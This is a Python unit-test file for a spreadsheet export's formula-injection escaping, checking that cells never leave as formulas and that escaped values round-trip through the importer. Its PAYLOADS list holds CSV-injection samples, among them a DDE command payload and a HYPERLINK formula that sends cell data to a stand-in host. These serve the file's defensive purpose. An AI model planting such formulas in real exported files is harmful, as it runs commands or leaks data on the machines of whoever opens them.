"""Cells that a spreadsheet would run instead of read.

A CSV this app writes is opened by double-clicking it, which means Excel or
LibreOffice, which means a cell beginning ``=`` is a formula and not text. The
values in those cells are product names, customer notes and audit detail --
typed by staff, or imported wholesale from a supplier's price list.

These tests pin both halves of the fix: that nothing leaves as a formula, and
that the escaping does not damage the catalogue export, which this app's own
importer is expected to read back exactly.
"""

from __future__ import annotations

import unittest

from app.spreadsheets import FORMULA_STARTERS, plain_text, safe_cell

PAYLOADS = (
    '=HYPERLINK("http://example.invalid/"&A1,"Click for refund")',
    '=cmd|\' /C calc\'!A0',
    "+1+1",
    "-2+3",
    "@SUM(1:1)",
    "\tstill a formula",
    "\rstill a formula",
)


class EscapingTests(unittest.TestCase):
    def test_a_formula_never_leaves_as_a_formula(self):
        for payload in PAYLOADS:
            with self.subTest(payload=payload):
                cell = safe_cell(payload)
                self.assertFalse(
                    cell.startswith(FORMULA_STARTERS),
                    "this cell would be evaluated when the file is opened",
                )

    def test_ordinary_text_is_left_exactly_alone(self):
        for value in ("Widget", "Acme Ltd.", "", "3 x 5cm", "Aida Khoury"):
            with self.subTest(value=value):
                self.assertEqual(safe_cell(value), value)

    def test_a_formula_character_anywhere_but_the_front_is_harmless(self):
        """Only the first character decides, so "A=B" must not be touched."""
        self.assertEqual(safe_cell("Bolt M6-30"), "Bolt M6-30")
        self.assertEqual(safe_cell("Ratio 1+1"), "Ratio 1+1")

    def test_a_missing_value_becomes_an_empty_cell(self):
        self.assertEqual(safe_cell(None), "")

    def test_a_number_is_written_out_as_its_text(self):
        self.assertEqual(safe_cell(7), "7")


class RoundTripTests(unittest.TestCase):
    """The catalogue export is documented as something the importer re-reads."""

    def test_every_payload_survives_the_round_trip_intact(self):
        for payload in PAYLOADS:
            with self.subTest(payload=payload):
                self.assertEqual(plain_text(safe_cell(payload)), payload)

    def test_an_apostrophe_someone_typed_is_not_eaten(self):
        """The reason safe_cell escapes a leading apostrophe as well.

        Without that, reading a file back would strip the apostrophe from a
        name the shop actually typed, and the importer would then plan a
        change to a product nobody had edited.
        """
        for value in ("'Special' edition", "''", "'", "O'Brien"):
            with self.subTest(value=value):
                self.assertEqual(plain_text(safe_cell(value)), value)

    def test_a_foreign_file_keeps_its_own_apostrophes(self):
        """A supplier's file was never escaped by us, so nothing is removed."""
        self.assertEqual(plain_text("'Special' edition"), "'Special' edition")
        self.assertEqual(plain_text("O'Brien Tools"), "O'Brien Tools")

    def test_a_supplier_file_that_arrives_already_escaped_still_works(self):
        """Some systems escape on the way out too; we undo exactly one."""
        self.assertEqual(plain_text("'=SUM(A1)"), "=SUM(A1)")


if __name__ == "__main__":
    unittest.main()
